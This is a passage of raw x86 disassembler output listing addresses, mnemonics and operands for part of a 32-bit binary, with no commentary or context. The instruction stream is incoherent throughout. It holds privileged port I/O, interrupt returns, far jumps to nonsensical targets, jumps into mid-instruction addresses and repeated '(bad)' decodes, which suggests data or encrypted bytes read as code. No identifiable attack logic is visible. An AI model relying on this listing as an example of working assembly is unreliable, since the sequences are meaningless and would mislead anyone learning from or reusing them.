  403167:	je     0x403142
  403169:	inc    ecx
  40316a:	in     eax,0x18
  40316c:	jmp    0x40316b
  40316e:	iret   
  40316f:	pop    ecx
  403170:	jb     0x4031e5
  403172:	loop   0x4031ee
  403174:	push   eax
  403175:	dec    ecx
  403176:	jmp    0xc273b996
  40317b:	xchg   ecx,eax
  40317c:	jno    0x40310e
  40317e:	sub    eax,0x52a6c9c5
  403183:	pop    ebx
  403184:	pop    ecx
  403185:	loop   0x4031ae
  403187:	push   eax
  403188:	sar    DWORD PTR [esi-0x6],0x6e
  40318c:	inc    edx
  40318d:	mov    ch,0x43
  40318f:	mov    dl,0xee
  403191:	mov    ds,WORD PTR [ebx+eax*2-0xaba584b]
  403198:	push   0xe626f2ab
  40319d:	push   ds
  40319e:	mov    eax,ds:0xb1ce701a
  4031a3:	js     0x403135
  4031a5:	mov    al,0x9e
  4031a7:	add    DWORD PTR [eax+ebp*8-0x67],esp
  4031ab:	jmp    0x8f04:0xa61f7e84
  4031b2:	mov    dl,0x8a
  4031b4:	push   ebp
  4031b5:	and    BYTE PTR ds:0xcf37a3d7,al
  4031bb:	call   0x97563414
  4031c0:	ret    
  4031c1:	in     al,0xe2
  4031c3:	icebp  
  4031c4:	sub    eax,0x1df9ad6a
  4031c9:	arpl   WORD PTR [esi-0x47392e6f],bp
  4031cf:	arpl   WORD PTR es:[ecx+esi*8+0x4e9c027c],bp
  4031d7:	xchg   ebx,eax
  4031d8:	mov    dl,0x6e
  4031da:	sbb    BYTE PTR [edx-0x19],al
  4031dd:	jmp    0xab32:0x9969b419
  4031e4:	int3   
  4031e5:	push   ecx
  4031e6:	mov    eax,0xb48b2f18
  4031eb:	sti    
  4031ec:	cmp    BYTE PTR [ebp+ecx*1+0x5a1c82a6],cl
  4031f3:	pop    ss
  4031f4:	test   edx,ebp
  4031f6:	outs   dx,DWORD PTR ds:[esi]
  4031f7:	loop   0x40326a
  4031f9:	or     al,0xbb
  4031fb:	mov    ch,0x28
  4031fd:	dec    esi
  4031fe:	or     dh,bl
  403200:	mov    bl,0x6a
  403202:	daa    
  403203:	data16 mov dh,0x4f
  403206:	and    ecx,DWORD PTR [esi+ebp*8+0x1700fa40]
  40320d:	cmp    eax,0xd0d78899
  403212:	mov    bl,bl
  403214:	inc    ebp
  403215:	ret    0xf6ba
  403218:	xchg   ecx,eax
  403219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40321a:	aas    
  40321b:	mov    ecx,0xad7a9cc1
  403220:	or     ebp,DWORD PTR [eax-0x4b]
  403223:	shrd   DWORD PTR [edi],ebp,cl
  403226:	inc    ecx
  403227:	sbb    esi,DWORD PTR [edi]
  403229:	cmp    al,0x21
  40322b:	leave  
  40322c:	cs or  eax,0xc6347da
  403232:	mov    ds:0xc71ecee1,eax
  403237:	gs jmp 0x403264
  40323a:	repz jno 0x403233
  40323d:	lods   al,BYTE PTR ds:[esi]
  40323e:	dec    ebp
  40323f:	iret   
  403240:	pop    ecx
  403241:	add    bl,bl
  403243:	stos   BYTE PTR es:[edi],al
  403244:	xchg   ecx,eax
  403245:	hlt    
  403246:	adc    BYTE PTR ds:0x2f08eac7,al
  40324c:	fs gs dec ecx
  40324f:	je     0x403224
  403251:	call   0xd8f0:0x601050bd
  403258:	mov    ebx,0x4879946e
  40325d:	cmp    DWORD PTR [edi],esi
  40325f:	stos   DWORD PTR es:[edi],eax
  403260:	fbstp  TBYTE PTR [ebp-0x54b4001b]
  403266:	or     eax,0xa4c00895
  40326b:	jle    0x403297
  40326d:	sbb    DWORD PTR [edx+0x50],0x5547e924
  403274:	jmp    0x3812:0x79dccc69
  40327b:	inc    eax
  40327c:	in     al,dx
  40327d:	jns    0x4032d5
  40327f:	cmp    eax,0xb229f770
  403284:	in     al,dx
  403285:	sub    eax,0x4a5c1983
  40328a:	retf   0x1fcf
  40328d:	adc    bh,BYTE PTR [edx+eiz*2]
  403290:	arpl   WORD PTR [ebx],dx
  403292:	outs   dx,DWORD PTR ds:[esi]
  403293:	jmp    0x4032ad
  403295:	pusha  
  403296:	cli    
  403297:	mov    eax,0xe86ff98f
  40329c:	adc    BYTE PTR [edi+0x47b612c3],ah
  4032a2:	xor    dl,BYTE PTR [ebx+0x60]
  4032a5:	je     0x403306
  4032a7:	loope  0x40329b
  4032a9:	iret   
  4032aa:	push   eax
  4032ab:	pop    ss
  4032ac:	pop    esi
  4032ad:	cmovg  di,WORD PTR [ebx-0x1a94d9ed]
  4032b5:	popa   
  4032b6:	bound  edx,QWORD PTR [eax+eax*2+0x41c6bde4]
  4032bd:	xor    al,0x6f
  4032bf:	jle    0x40332a
  4032c1:	aas    
  4032c2:	xchg   edi,eax
  4032c3:	and    BYTE PTR [edi+ecx*4],ch
  4032c6:	test   DWORD PTR ds:0x46a62f89,ebp
  4032cc:	fwait
  4032cd:	and    al,0x91
  4032cf:	lds    esi,FWORD PTR [edi]
  4032d1:	mov    eax,ds:0x44cebc3f
  4032d6:	retf   
  4032d7:	xor    BYTE PTR [esi+0x6c],dh
  4032da:	(bad)  
  4032db:	and    DWORD PTR [eax+0x4c370690],edx
  4032e1:	in     eax,0xd3
  4032e3:	or     DWORD PTR [edx+0x13baf9a8],ecx
  4032e9:	inc    DWORD PTR [ecx+0x3f]
  4032ec:	inc    edi
  4032ed:	sbb    eax,0xfe8b9f31
  4032f2:	dec    ebx
  4032f3:	or     DWORD PTR [eax-0x2bd78df9],edx
  4032f9:	daa    
  4032fa:	out    0x95,eax
  4032fc:	ds stos DWORD PTR es:[edi],eax
  4032fe:	leave  
  4032ff:	jbe    0x40333f
  403301:	add    ebx,0x4afb346a
  403307:	(bad)  
  403308:	das    
  403309:	mov    eax,0xf438b511
  40330e:	loop   0x403350
  403310:	rcr    DWORD PTR [edi],cl
  403312:	mov    cl,0xc1
  403314:	jp     0x403349
  403316:	aam    0x9a
  403318:	jmp    0xd0631527
  40331d:	and    bl,BYTE PTR [edx-0x31]
  403320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403321:	cmp    eax,0xd463c5f
  403326:	mov    ch,0xed
  403328:	imul   BYTE PTR [ebp+0xf]
  40332b:	sub    DWORD PTR es:[ecx+0x21],edx
  40332f:	aas    
  403330:	(bad)  
  403331:	shr    DWORD PTR [ecx],1
  403333:	mov    DWORD PTR [ecx+0x6a],esp
  403336:	xchg   esp,eax
  403337:	ds xchg esi,eax
  403339:	sub    eax,0xeb5ff34d
  40333e:	test   bh,0x9f
  403341:	cmp    eax,0x4e137281
  403346:	fisttp DWORD PTR [edi]
  403348:	inc    edx
  403349:	fadd   st(2),st
  40334b:	pop    ecx
  40334c:	sub    al,0x4e
  40334e:	shl    BYTE PTR [edx],cl
  403350:	push   0x93ef5b66
  403355:	and    BYTE PTR [eax],0x79
  403358:	mov    bh,0x7
  40335a:	int    0xb7
  40335c:	rcr    BYTE PTR [ebx+ecx*4],cl
  40335f:	adc    bh,bh
  403361:	out    dx,al
  403362:	mov    ebx,0x8c586a78
  403367:	jle    0x4033d6
  403369:	push   esi
  40336a:	dec    esp
  40336b:	or     eax,0x2c05854b
  403370:	ins    DWORD PTR es:[edi],dx
  403371:	jge    0x40334f
  403373:	push   ebp
  403374:	push   esi
  403375:	jb     0x403386
  403377:	fmulp  st(3),st
  403379:	sub    eax,0x55fe08c4
  40337e:	xor    DWORD PTR [edi+0x3f],edi
  403381:	clc    
  403382:	scas   al,BYTE PTR es:[edi]
  403383:	adc    dl,BYTE PTR [edi+0x3d]
  403386:	push   0xa51e0465
  40338b:	mov    dl,0xef
  40338d:	in     eax,0xb8
  40338f:	fnstcw WORD PTR [ebx]
  403391:	cwde   
  403392:	add    eax,0xb2a96b0
  403397:	mov    ebx,DWORD PTR [eax]
  403399:	and    al,0x1
  40339b:	js     0x4033fb
  40339d:	mov    edi,0xbcc683f5
  4033a2:	fnstcw WORD PTR [ebp+0x483a42ce]
  4033a8:	(bad)  
  4033a9:	loope  0x4033a2
  4033ab:	jno    0x4033a1
  4033ad:	jle    0x4033a4
  4033af:	mov    WORD PTR [esi],ds
  4033b1:	sahf   
  4033b2:	int3   
  4033b3:	mov    edi,0xc697a82b
  4033b8:	push   cs
  4033b9:	or     DWORD PTR [ecx+0x24],ebp
  4033bc:	mov    ds:0xb6df52e,eax
  4033c1:	xlat   BYTE PTR ds:[ebx]
  4033c2:	stos   BYTE PTR es:[edi],al
  4033c3:	fs sub cl,al
  4033c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033c7:	arpl   WORD PTR [edx+0x51ac29f4],ax
  4033cd:	sbb    edx,ebx
  4033cf:	retf   
  4033d0:	repnz push cs
  4033d2:	jb     0x4033ac
  4033d4:	inc    eax
  4033d5:	(bad)  
  4033d6:	outs   dx,DWORD PTR ds:[esi]
  4033d7:	push   esp
  4033d8:	neg    DWORD PTR ds:0xff15462d
  4033de:	cmp    al,0x8d
  4033e0:	sbb    DWORD PTR [eax],0x1b
  4033e3:	popf   
  4033e4:	clc    
  4033e5:	or     al,0xcb
  4033e7:	mov    ?,WORD PTR [ecx]
  4033e9:	jge    0x40343d
  4033eb:	repz xor eax,0x4a1f8b4c
  4033f1:	je     0x4033e1
  4033f3:	sbb    BYTE PTR [ebx+0x2b],0x51
  4033f7:	push   esi
  4033f8:	inc    esp
  4033f9:	ficomp DWORD PTR [eax]
  4033fb:	aas    
  4033fc:	sbb    al,0x53
  4033fe:	enter  0x6653,0x3c
  403402:	aas    
  403403:	scas   eax,DWORD PTR es:[edi]
  403404:	(bad)  
  403405:	aam    0x70
  403407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403408:	inc    ebp
  403409:	push   edi
  40340a:	xchg   edi,eax
  40340b:	push   ebp
  40340c:	lods   al,BYTE PTR ds:[esi]
  40340d:	push   cs
  40340e:	and    esp,DWORD PTR [esi-0x1e1104e9]
  403414:	cmp    ebx,DWORD PTR [ebx]
  403416:	mov    edx,0x88910843
  40341b:	ds mov ecx,0x8cc367a
  403421:	outs   dx,BYTE PTR ds:[esi]
  403422:	push   ds
  403423:	and    eax,0x33eff074
  403428:	push   ebp
  403429:	lods   al,BYTE PTR ds:[esi]
  40342a:	or     dh,0xf
  40342d:	add    BYTE PTR [ecx+edi*1+0x53bfa370],cl
  403434:	iret   
  403435:	ss into 
  403437:	ins    DWORD PTR es:[edi],dx
  403438:	clc    
  403439:	repnz es adc eax,0xe0fe2d43
  403440:	sar    BYTE PTR [ecx],0x55
  403443:	inc    edi
  403444:	call   0x49ab1838
  403449:	bound  esi,QWORD PTR [esi]
  40344b:	inc    eax
  40344c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40344d:	xchg   esi,eax
  40344e:	push   0x54ee7378
  403453:	loopne 0x403471
  403455:	enter  0x909b,0xeb
  403459:	fdivr  QWORD PTR [edx-0x1cafd40c]
  40345f:	in     eax,0xdd
  403461:	add    ebp,DWORD PTR [ebx-0x67]
  403464:	out    dx,eax
  403465:	or     eax,0xe18b8632
  40346a:	aam    0xca
  40346c:	jmp    0x403488
  40346e:	in     eax,0x24
  403470:	pushf  
  403471:	icebp  
  403472:	popa   
  403473:	test   ah,al
  403475:	xchg   edx,eax
  403476:	in     al,dx
  403477:	xchg   DWORD PTR [edx-0x6f560b9],ecx
  40347d:	lahf   
  40347e:	stos   BYTE PTR es:[edi],al
  40347f:	and    edx,DWORD PTR [edx]
  403481:	idiv   ecx
  403483:	mov    ch,0x76
  403485:	mov    dh,0xe1
  403487:	out    dx,al
  403488:	pop    es
  403489:	cmp    DWORD PTR [ecx-0x2b],esp
  40348c:	mov    bl,0xc8
  40348e:	xchg   DWORD PTR [edi-0x382b7611],eax
  403494:	loopne 0x403428
  403496:	shl    DWORD PTR [edi+edi*8+0x1d],0x2d
  40349b:	mov    bl,0xd3
  40349d:	xchg   DWORD PTR [esp+edx*4],ebx
  4034a0:	mov    edx,0x8b2aa660
  4034a5:	pop    esi
  4034a6:	xchg   edx,eax
  4034a7:	fwait
  4034a8:	pop    ebp
  4034a9:	ja     0x403503
  4034ab:	imul   edi,DWORD PTR [edx],0x5a
  4034ae:	ret    0x24a2
  4034b1:	je     0x4034ad
  4034b3:	mov    edi,0x30e76192
  4034b8:	icebp  
  4034b9:	xchg   ebp,eax
  4034ba:	and    al,0xdb
  4034bc:	mov    esi,0x1d1959fe
  4034c1:	sub    BYTE PTR [ebp-0x2f02e4ad],dh
  4034c7:	lds    edi,FWORD PTR [ebp-0x13]
  4034ca:	mov    ebx,0x32232020
  4034cf:	clc    
  4034d0:	and    eax,0x56d6f646
  4034d5:	sar    al,cl
  4034d7:	out    dx,eax
  4034d8:	xlat   BYTE PTR ds:[ebx]
  4034d9:	mov    DWORD PTR [ebp-0x6fe1bb5e],edi
  4034df:	mov    dh,0x98
  4034e1:	jb     0x403512
  4034e3:	loope  0x403560
  4034e5:	shl    DWORD PTR [esi],0xdf
  4034e8:	cmp    DWORD PTR [ebx],ecx
  4034ea:	mov    esi,0xacdb33d4
  4034ef:	jnp    0x4034f2
  4034f1:	repz rcl BYTE PTR [ebx-0x1aa3e85d],cl
  4034f8:	icebp  
  4034f9:	mov    esi,0xb901ed98
  4034fe:	dec    ebx
  4034ff:	jp     0x4034ea
  403501:	pop    edi
  403502:	pop    ecx
  403503:	arpl   WORD PTR [ecx+0x37103791],bp
  403509:	mov    edx,0xdb0c17e8
  40350e:	shl    eax,1
  403510:	pop    edx
  403511:	mov    BYTE PTR [esi],0x10
  403514:	mov    ds:0x66e58acd,eax
  403519:	shl    DWORD PTR [esi-0x5121b982],0xca
  403520:	sbb    eax,0x350f74e1
  403525:	icebp  
  403526:	in     eax,0xc7
  403528:	dec    edx
  403529:	add    cl,al
  40352b:	ja     0x4035a1
  40352d:	cmp    BYTE PTR ds:0xcbfe647a,0xd6
  403534:	shl    DWORD PTR [ecx+0x34],cl
  403537:	cdq    
  403538:	dec    esp
  403539:	fistp  QWORD PTR [eax+0xb]
  40353c:	jmp    DWORD PTR [ebx-0x31]
  40353f:	fwait
  403540:	retf   
  403541:	mov    ah,dl
  403543:	iret   
  403544:	or     al,0x7f
  403546:	xabort 0x82
  403549:	mov    DWORD PTR ds:0x7412c0be,edx
  40354f:	ret    0xbb68
  403552:	aas    
  403553:	es out dx,eax
  403555:	xor    eax,0x53b2e94e
  40355a:	(bad)
  40355d:	push   ds
  40355e:	dec    ebp
  40355f:	lock fnsave [ebx-0x446a4018]
  403566:	in     al,dx
  403567:	in     al,0xde
  403569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40356a:	js     0x403595
  40356c:	inc    ecx
  40356d:	lods   eax,DWORD PTR ds:[esi]
  40356e:	stc    
  40356f:	inc    esi
  403570:	jecxz  0x403533
  403572:	mov    cl,0xee
  403574:	lods   eax,DWORD PTR ds:[esi]
  403575:	aaa    
  403576:	int3   
  403577:	jb     0x4035db
  403579:	inc    ebp
  40357a:	push   ebx
  40357b:	scas   eax,DWORD PTR es:[edi]
  40357c:	sbb    DWORD PTR ds:0x48dfba8,ecx
  403582:	repz icebp 
  403584:	jno    0x403591
  403586:	mov    DWORD PTR [edi],edi
  403588:	pop    ds
  403589:	sub    DWORD PTR [ebx+eiz*4],esp
  40358c:	lods   eax,DWORD PTR ds:[esi]
  40358d:	add    DWORD PTR [ebp+0x288656fd],esi
  403593:	inc    eax
  403594:	jnp    0x4035cd
  403596:	fadd   QWORD PTR [ebp-0x4d4a8185]
  40359c:	loop   0x403619
  40359e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40359f:	xor    cl,ch
  4035a1:	sbb    eax,0xe1ed050a
  4035a6:	arpl   sp,bp
  4035a8:	pop    ds
  4035a9:	mov    cl,0xb4
  4035ab:	out    0xc,al
  4035ad:	push   0x33
  4035af:	dec    edx
  4035b0:	sub    ebp,DWORD PTR [eax+0x57b02428]
  4035b6:	fnstenv [edx+ebp*8+0x7f04276c]
  4035bd:	int    0x20
  4035bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035c0:	mov    bl,0x3c
  4035c2:	test   bh,ch
  4035c4:	pop    esi
  4035c5:	xor    ecx,DWORD PTR ds:0xa33cdc25
  4035cb:	loope  0x403630
  4035cd:	mov    edx,0x4322153c
  4035d2:	jmp    0x4035ad
  4035d4:	sub    edi,DWORD PTR [edx-0x1b590547]
  4035da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035db:	fsubp  st(4),st
  4035dd:	mov    WORD PTR [ebx+0x55ca89e7],es
  4035e3:	xchg   esi,eax
  4035e4:	adc    BYTE PTR [ecx+esi*8+0x70cb8a9c],dl
  4035eb:	neg    DWORD PTR [eax-0x4e5dbe80]
  4035f1:	or     ebx,eax
  4035f3:	into   
  4035f4:	call   0xe3836225
  4035f9:	dec    edi
  4035fa:	xchg   BYTE PTR [edi-0x68b9be7a],ch
  403600:	mov    ds:0x34db69f5,al
  403605:	dec    edi
  403606:	add    dl,BYTE PTR [esi+0x2fe2873f]
  40360c:	push   ecx
  40360d:	sbb    al,0xf1
  40360f:	in     eax,0x16
  403611:	xor    BYTE PTR [ebx-0x2e1cf687],bh
  403617:	xchg   ecx,eax
  403618:	sub    eax,esi
  40361a:	js     0x4035f7
  40361c:	popa   
  40361d:	cld    
  40361e:	xchg   edx,eax
  40361f:	sub    al,0x7f
  403621:	or     al,0xe2
  403623:	lds    ebp,FWORD PTR [ecx-0xb65573a]
  403629:	je     0x4035fd
  40362b:	mov    bl,0x81
  40362d:	sub    DWORD PTR [edx],eax
  40362f:	mov    esi,0x2c4d844f
  403635:	retfw  
  403637:	xor    ebx,ecx
  403639:	in     eax,0xcf
  40363b:	in     al,dx
  40363c:	fld    QWORD PTR [edi+0x20f6432f]
  403642:	cli    
  403643:	adc    ebx,0x6b
  403646:	adc    cl,BYTE PTR [edx]
  403648:	pop    ds
  403649:	xchg   DWORD PTR [esi+0x2a],ecx
  40364c:	cmp    al,0xc2
  40364e:	adc    dl,dh
  403650:	iret   
  403651:	and    BYTE PTR [ebx],bh
  403653:	outs   dx,DWORD PTR ds:[esi]
  403654:	jbe    0x403670
  403656:	mov    bl,0x73
  403658:	add    al,0x79
  40365a:	push   esp
  40365b:	pop    edx
  40365c:	cmc    
  40365d:	fwait
  40365e:	jg     0x403693
  403660:	sub    DWORD PTR [eax+0x2],ecx
  403663:	and    DWORD PTR cs:[ecx-0x2646c3d8],eax
  40366a:	push   ds
  40366b:	push   ecx
  40366c:	adc    BYTE PTR [edx+0x48943b53],bh
  403672:	xchg   esi,eax
  403673:	adc    ebx,DWORD PTR [edi-0x55]
  403676:	bnd jmp 0x403648
  403679:	leave  
  40367a:	and    BYTE PTR [ebx],dh
  40367c:	jae    0x4036ee
  40367e:	adc    DWORD PTR [edx-0x65f5c0ad],ebx
  403684:	arpl   WORD PTR gs:[ebx],bp
  403687:	push   edi
  403688:	inc    ecx
  403689:	fdiv   st(4),st
  40368b:	stc    
  40368c:	or     DWORD PTR es:[edx],0xffffffd3
  403690:	lods   eax,DWORD PTR ds:[esi]
  403691:	es mov ah,0x9d
  403694:	(bad)  
  403695:	sbb    eax,DWORD PTR [ecx-0x6e4fb177]
  40369b:	retf   0x72b1
  40369e:	enter  0x1dc9,0x31
  4036a2:	mov    edx,DWORD PTR cs:[edx+0x3e]
  4036a6:	xchg   edi,eax
  4036a7:	xchg   esi,eax
  4036a8:	sub    al,0xe5
  4036aa:	loop   0x403652
  4036ac:	sub    BYTE PTR [ecx+0x44],0xae
  4036b0:	into   
  4036b1:	cmp    bh,BYTE PTR [ecx+0x45548802]
  4036b7:	or     ah,0x51
  4036ba:	test   al,0x22
  4036bc:	cmpxchg DWORD PTR [ebx],esp
  4036bf:	xchg   edx,eax
  4036c0:	les    ebp,FWORD PTR [edi+0x22]
  4036c3:	out    dx,eax
  4036c4:	pop    ebx
  4036c5:	ds stc 
  4036c7:	or     al,0x2e
  4036c9:	dec    eax
  4036ca:	push   ebx
  4036cb:	xchg   edi,eax
  4036cc:	xchg   dh,dh
  4036ce:	xor    DWORD PTR [edx],esi
  4036d0:	dec    eax
  4036d1:	or     DWORD PTR [edx+0x6d],ebp
  4036d4:	lods   eax,DWORD PTR ds:[esi]
  4036d5:	mov    bl,0x7e
  4036d7:	stos   BYTE PTR es:[edi],al
  4036d8:	dec    esp
  4036d9:	mov    edi,0xf4e6f62e
  4036de:	ror    BYTE PTR [ecx-0x77430a86],0xe5
  4036e5:	jle    0x403746
  4036e7:	call   0x16e0:0xa38db3a6
  4036ee:	out    0xc2,eax
  4036f0:	cmp    eax,eax
  4036f2:	jno    0x4036f6
  4036f4:	sti    
  4036f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036f6:	jo     0x40375c
  4036f8:	pusha  
  4036f9:	push   cs
  4036fa:	(bad)  
  4036fb:	enter  0x2882,0x31
  4036ff:	xchg   DWORD PTR [esp+ebp*8+0x25],eax
  403703:	hlt    
  403704:	inc    ebp
  403705:	jo     0x4036c9
  403707:	dec    esi
  403708:	mov    ebx,0x3bd00412
  40370d:	and    bh,BYTE PTR [ecx]
  40370f:	inc    ecx
  403710:	stc    
  403711:	pop    es
  403712:	xor    esp,DWORD PTR [eax-0x86792b5]
  403718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403719:	adc    BYTE PTR [ecx-0x5808f405],bh
  40371f:	inc    edx
  403720:	sbb    al,al
  403722:	stos   DWORD PTR es:[edi],eax
  403723:	out    dx,eax
  403724:	jle    0x403767
  403726:	aad    0x87
  403728:	xor    ebp,DWORD PTR [ebx]
  40372a:	popa   
  40372b:	pop    edi
  40372c:	iret   
  40372d:	dec    esi
  40372e:	push   0xffffffef
  403730:	inc    edi
  403731:	sbb    al,0x5
  403733:	dec    ecx
  403734:	inc    esp
  403735:	in     eax,dx
  403736:	mov    eax,0xbfaaa65e
  40373b:	mov    al,ds:0xb097a95e
  403740:	das    
  403741:	clc    
  403742:	jge    0x403735
  403744:	in     eax,0xfd
  403746:	push   ecx
  403747:	mov    esp,0xfccbd55
  40374c:	enter  0x3383,0x45
  403750:	aaa    
  403751:	mov    ebp,0x3d7c911
  403756:	inc    esp
  403757:	scas   al,BYTE PTR es:[edi]
  403758:	pop    ds
  403759:	out    dx,eax
  40375a:	mov    esp,0xe3db6023
  40375f:	mov    ebp,0x7690eedb
  403764:	cmp    esi,ebx
  403766:	pusha  
  403767:	cmp    eax,0xae4b815b
  40376c:	dec    esi
  40376d:	jb     0x403797
  40376f:	pop    es
  403770:	in     al,dx
  403771:	push   0xfffffff9
  403773:	stos   DWORD PTR es:[edi],eax
  403774:	xchg   bh,bl
  403776:	adc    BYTE PTR [ebp+0x76c28136],al
  40377c:	xchg   edi,ecx
  40377e:	push   ebx
  40377f:	xchg   ecx,eax
  403780:	imul   edi,DWORD PTR [edx-0x45],0x8e551bea
  403787:	clc    
  403788:	jecxz  0x40378a
  40378a:	adc    eax,0x7d79ca7b
  40378f:	hlt    
  403790:	into   
  403791:	inc    ebp
  403792:	(bad)
  403797:	sbb    BYTE PTR [ecx+edx*1-0x646a6493],0xbe
  40379f:	cmp    cl,BYTE PTR [ebx-0x3a59699f]
  4037a5:	test   al,0x4b
  4037a7:	push   ecx
  4037a8:	das    
  4037a9:	imul   ebx
  4037ab:	cmp    DWORD PTR [ecx+0x5219f70c],edi
  4037b1:	daa    
  4037b2:	xor    eax,0x66ba11c5
  4037b7:	push   es
  4037b8:	mov    esi,0xe310c49b
  4037bd:	stc    
  4037be:	xchg   esp,eax
  4037bf:	xor    dh,BYTE PTR [ebp+0x58]
  4037c2:	out    dx,eax
  4037c3:	adc    edx,0xd49c482e
  4037c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ca:	(bad)
  4037ce:	mov    bl,0xc0
  4037d0:	ret    
  4037d1:	or     DWORD PTR [ebx+esi*4-0x22],ecx
  4037d5:	outs   dx,DWORD PTR ds:[esi]
  4037d6:	jne    0x40380e
  4037d8:	jbe    0x403831
  4037da:	(bad)  
  4037db:	imul   edx,DWORD PTR [esi-0x4c],0x3d1af806
  4037e2:	jbe    0x403858
  4037e4:	out    dx,al
  4037e5:	sub    DWORD PTR [ebp+0xe],esp
  4037e8:	in     al,0x0
  4037ea:	inc    edx
  4037eb:	jp     0x40383b
  4037ed:	and    BYTE PTR [esi-0x6c43f7fd],bh
  4037f3:	(bad)  
  4037f4:	jecxz  0x40380e
  4037f6:	pushf  
  4037f7:	xor    BYTE PTR [edx-0x66],ch
  4037fa:	enter  0x35f3,0x83
  4037fe:	mov    ch,0xd1
  403800:	cmp    eax,esi
  403802:	cs dec edi
  403804:	mov    bh,0x63
  403806:	add    DWORD PTR ds:0x161de036,ebx
  40380c:	cdq    
  40380d:	add    ah,dh
  40380f:	push   ecx
  403810:	stos   BYTE PTR es:[edi],al
  403811:	nop
  403812:	ja     0x40384c
  403814:	mov    ch,0x56
  403816:	push   ss
  403817:	rcr    BYTE PTR [ecx+0x40],0xe0
  40381b:	scas   eax,DWORD PTR es:[edi]
  40381c:	mov    ah,0xd3
  40381e:	nop
  40381f:	pop    edi
  403820:	pop    esp
  403821:	mov    dh,0x9f
  403823:	pop    ecx
  403824:	(bad)  
  403825:	neg    DWORD PTR [esp+edi*1-0x78]
  403829:	lds    ebx,FWORD PTR [eax]
  40382b:	mul    al
  40382d:	jb     0x403878
  40382f:	mov    ecx,0x7210edcd
  403834:	jb     0x4037f9
  403836:	shr    BYTE PTR [eax+0x18],1
  403839:	into   
  40383a:	lods   al,BYTE PTR ds:[esi]
  40383b:	js     0x40380e
  40383d:	jno    0x403864
  40383f:	repnz or dh,dl
  403842:	push   esp
  403843:	mov    ebx,edi
  403845:	sahf   
  403846:	imul   edi,DWORD PTR [eax+0x3],0x6e
  40384a:	jns    0x403868
  40384c:	cwde   
  40384d:	jne    0x40388e
  40384f:	mov    al,ds:0x7774c427
  403854:	jmp    0x4037fd
  403856:	xchg   edx,eax
  403857:	mov    eax,ds:0xbaee5e9
  40385c:	test   eax,0xe8475d39
  403861:	or     eax,0x4887781e
  403866:	mov    al,ds:0xed7f5291
  40386b:	cmp    edx,edx
  40386d:	mov    dl,0xe
  40386f:	mov    al,0x8d
  403871:	jns    0x403898
  403873:	jmp    0x403826
  403875:	xor    ch,bh
  403877:	lds    esi,FWORD PTR [ecx+0x388da07b]
  40387d:	clc    
  40387e:	in     al,dx
  40387f:	cmp    ebx,DWORD PTR [esi+0x4b]
  403882:	popf   
  403883:	add    al,BYTE PTR [edi]
  403885:	push   ebx
  403886:	mov    ah,0x25
  403888:	inc    edx
  403889:	fisub  DWORD PTR [ebp-0x46ac5c3a]
  40388f:	gs cld 
  403891:	or     bh,BYTE PTR [ebp-0x2f]
  403894:	sub    al,0xc7
  403896:	rcl    DWORD PTR [esi+eax*1-0x1e],1
  40389a:	sub    BYTE PTR [eax+eiz*4-0x41],0x5f
  40389f:	ins    BYTE PTR es:[edi],dx
  4038a0:	push   ss
  4038a1:	std    
  4038a2:	mov    cl,bh
  4038a4:	push   esi
  4038a5:	mov    ebx,0x8d19cedf
  4038aa:	sub    ah,BYTE PTR [edi]
  4038ac:	jecxz  0x40383a
  4038ae:	xchg   esi,eax
  4038af:	(bad)
  4038b2:	push   ebp
  4038b3:	ret    
  4038b4:	xor    BYTE PTR [esi],bh
  4038b6:	iret   
  4038b7:	sub    cl,BYTE PTR [ebp+ecx*4+0x1c]
  4038bb:	outs   dx,BYTE PTR ds:[esi]
  4038bc:	pop    ds
  4038bd:	mov    edx,0xb2760de
  4038c2:	jl     0x403867
  4038c4:	pushf  
  4038c5:	or     bl,ch
  4038c7:	stc    
  4038c8:	xchg   ebx,eax
  4038c9:	cld    
  4038ca:	call   0xd59a:0xcddc7fce
  4038d1:	adc    BYTE PTR [ebp+edi*4+0x5828be11],ah
  4038d8:	jg     0x4038a7
  4038da:	xor    BYTE PTR [esi+0x6d],0x47
  4038de:	js     0x4038c5
  4038e0:	and    ebp,DWORD PTR [ecx]
  4038e2:	ss push ebx
  4038e4:	rcr    BYTE PTR [esi],1
  4038e6:	es push ebx
  4038e8:	ds in  eax,dx
  4038ea:	xor    al,0x1a
  4038ec:	aam    0x70
  4038ee:	jg     0x40392c
  4038f0:	leave  
  4038f1:	xchg   edi,eax
  4038f2:	xlat   BYTE PTR ds:[ebx]
  4038f3:	sbb    dh,BYTE PTR [ebx]
  4038f5:	cmp    eax,0x7c8326b1
  4038fa:	push   esi
  4038fb:	outs   dx,BYTE PTR ds:[esi]
  4038fc:	pop    esi
  4038fd:	fs rcl edi,cl
  403900:	xor    bl,BYTE PTR [edx+0x43b1ab5b]
  403906:	pusha  
  403907:	daa    
  403908:	and    dh,bl
  40390a:	push   edi
  40390b:	sub    esi,DWORD PTR [edi+0x3f]
  40390e:	shr    BYTE PTR [edx+0xce6f265],0x1a
  403915:	push   0xffffffc6
  403917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403918:	dec    edi
  403919:	add    cl,BYTE PTR [ebp-0x3af8251d]
  40391f:	jg     0x146f358a
  403925:	push   es
  403926:	sub    bh,bl
  403928:	fisttp WORD PTR [esi]
  40392a:	push   edx
  40392b:	out    0x86,eax
  40392d:	jge    0x403921
  40392f:	inc    esi
  403930:	repz jo 0x40394a
  403933:	pop    ss
  403934:	or     eax,0x75d0c333
  403939:	pop    edx
  40393a:	mov    cl,0x8c
  40393c:	cmp    eax,ecx
  40393e:	pop    eax
  40393f:	out    dx,al
  403940:	add    DWORD PTR [esi+esi*4-0x35],eax
  403944:	lahf   
  403945:	call   DWORD PTR [ecx+0x6fe00e5f]
  40394b:	xor    ebp,DWORD PTR [ecx-0x45a86d75]
